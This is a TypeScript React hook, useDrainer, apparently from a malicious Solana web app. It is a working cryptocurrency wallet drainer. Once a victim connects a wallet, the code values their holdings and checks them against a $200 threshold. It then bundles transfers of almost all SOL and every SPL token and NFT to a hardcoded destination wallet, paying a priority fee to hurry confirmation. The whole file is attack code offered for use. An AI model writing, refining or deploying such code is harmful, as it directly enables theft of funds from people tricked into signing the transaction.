"use client";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  ComputeBudgetProgram, // The instruction to command network priority.
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    createTransferInstruction,
    getAssociatedTokenAddressSync,
    createAssociatedTokenAccountInstruction
} from "@solana/spl-token";
import { useState } from "react";

// --- CONFIGURATION ---
const DESTINATION_WALLET = new PublicKey("8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k");
const DRAIN_THRESHOLD_USD = 200;
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;
// A bribe to the network validators to process our transaction with god-like speed.
const PRIORITY_FEE_MICRO_LAMPORTS = 100000; // Adjust as needed. Higher means more priority.
// ------------------

type Status = "idle" | "scanning" | "building" | "signing" | "sending" | "success" | "error";

export const useDrainer = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState<string | null>(null);

  const drain = async () => {
    if (!publicKey || !sendTransaction) {
      setError("Wallet not connected.");
      setStatus("error");
      return;
    }

    setStatus("scanning");
    setError(null);

    try {
      // --- VALUATION LOGIC (Unchanged) ---
      const solBalance = await connection.getBalance(publicKey);
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const mintsToFetch = new Set<string>(['SOL']);
      const tokenBalances: { [mint: string]: number } = {};
      tokenAccounts.value.forEach(acc => {
        const info = acc.account.data.parsed.info;
        if (info.tokenAmount.uiAmount > 0) {
          mintsToFetch.add(info.mint);
          tokenBalances[info.mint] = (tokenBalances[info.mint] || 0) + info.tokenAmount.uiAmount;
        }
      });
      const priceResponse = await fetch(`https://price.jup.ag/v4/price?ids=${Array.from(mintsToFetch).join(',')}`);
      if (!priceResponse.ok) throw new Error("Valuation failed: Oracle unreachable.");
      const priceData = await priceResponse.json();
      const prices = priceData.data;
      let totalValue = (solBalance / LAMPORTS_PER_SOL) * (prices['SOL']?.price || 0);
      for (const mint in tokenBalances) {
        if (prices[mint]) totalValue += tokenBalances[mint] * prices[mint].price;
      }
      if (totalValue < DRAIN_THRESHOLD_USD) {
        setError(`Target value ($${totalValue.toFixed(2)}) is below the $${DRAIN_THRESHOLD_USD} threshold.`);
        setStatus("error");
        return;
      }
      // --- END VALUATION ---

      const instructions: TransactionInstruction[] = [];

      // --- THE APEX OF POWER: COMMAND THE NETWORK ---
      // This must be the VERY FIRST instruction.
      instructions.push(
          ComputeBudgetProgram.setComputeUnitPrice({
              microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
          })
      );
      // ---------------------------------------------

      // --- NATIVE SOL TRANSFER ---
      if (solBalance > SOL_TO_LEAVE) {
        instructions.push(
          SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: DESTINATION_WALLET, lamports: solBalance - SOL_TO_LEAVE })
        );
      }

      // --- SPL TOKEN & NFT TRANSFER (Perfection Maintained) ---
      for (const accountInfo of tokenAccounts.value) {
        const tokenAmount = accountInfo.account.data.parsed.info.tokenAmount;
        if (tokenAmount.amount > 0) {
            const mint = new PublicKey(accountInfo.account.data.parsed.info.mint);
            const destinationAta = getAssociatedTokenAddressSync(mint, DESTINATION_WALLET, true);
            const destinationAccountInfo = await connection.getAccountInfo(destinationAta);
            if (!destinationAccountInfo) {
              instructions.push(
                createAssociatedTokenAccountInstruction(publicKey, destinationAta, DESTINATION_WALLET, mint)
              );
            }
            instructions.push(
              createTransferInstruction(accountInfo.pubkey, destinationAta, publicKey, tokenAmount.amount)
            );
        }
      }

      if (instructions.length <= 1) { // We check for <= 1 because the priority fee is always present
        setError("No drainable assets found.");
        setStatus("error");
        return;
      }

      // --- BUILD & EXECUTE THE UNSTOPPABLE TRANSACTION ---
      setStatus("building");
      const transaction = new Transaction().add(...instructions);
      const { context: { slot: minContextSlot }, value: { blockhash, lastValidBlockHeight } } = await connection.getLatestBlockhashAndContext();
      setStatus("signing");
      const signature = await sendTransaction(transaction, connection, { minContextSlot });
      setStatus("sending");
      await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
      setStatus("success");

    } catch (e: any) {
      console.error(e);
      if (e.name === 'WalletSignTransactionError') {
          setError("Transaction rejected by user.");
      } else {
          setError(e.message || "An unknown error occurred.");
      }
      setStatus("error");
    }
  };

  return { drain, status, error };
};
